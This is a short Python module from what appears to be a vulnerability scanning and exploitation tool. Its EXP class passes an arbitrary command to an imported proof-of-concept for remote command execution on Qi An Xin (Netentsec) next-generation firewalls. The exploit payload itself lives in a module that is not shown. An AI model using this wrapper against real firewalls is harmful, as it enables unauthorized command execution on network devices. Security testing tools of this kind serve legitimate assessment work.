# -*- coding:utf-8 -*-
# 奇安信 网康下一代防火墙RCE
from ServiceScanModel.models import ServiceScan
from VulnScanModel.models import VulnScan
from .nete_firewall_poc import POC
from ..requestClass import Requests


class EXP:
    def __init__(self, vuln: VulnScan):
        self.vuln = vuln
        self.requestUtil = Requests(vuln.cookies)


    def exp(self, cmd, content=""):
        poc = POC(ServiceScan(url=self.vuln.url, cookies=self.vuln.cookies))
        return poc.firewall_rce(self.vuln.url, cmd)